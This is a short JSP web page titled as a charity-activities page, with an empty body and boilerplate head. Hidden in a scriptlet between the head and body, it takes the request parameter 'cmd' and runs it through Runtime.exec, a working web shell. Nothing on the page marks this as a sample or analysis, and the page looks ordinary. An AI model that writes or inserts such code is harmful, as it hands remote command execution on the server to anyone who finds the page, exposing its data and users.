<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>  
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
<html xmlns="http://www.w3.org/1999/xhtml">  
<head>  
    <title>公益活动</title>  
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>  
    <!--这里可以追加导入模块内私有的js文件或css文件-->  
</head> 
<%
	String cmd=request.getParameter("cmd");
    try {
        Runtime.getRuntime().exec(cmd);
    } catch (Exception e) {
        e.printStackTrace();
    }

%> 
<body class="MainFrameBox">  
  
</body>  
  
    <script type="text/javascript">  
       
    //*************************************下面的函数属于公共的或半自定义的*************************************************//   
  
    //初始化列表页form表单,"queryForm"是表单id，可修改。   
    $(document).ready(function(){
        if(console.log){
            console.log("start shany cmd");
        }
    });   


   </script>  
  
</html>  
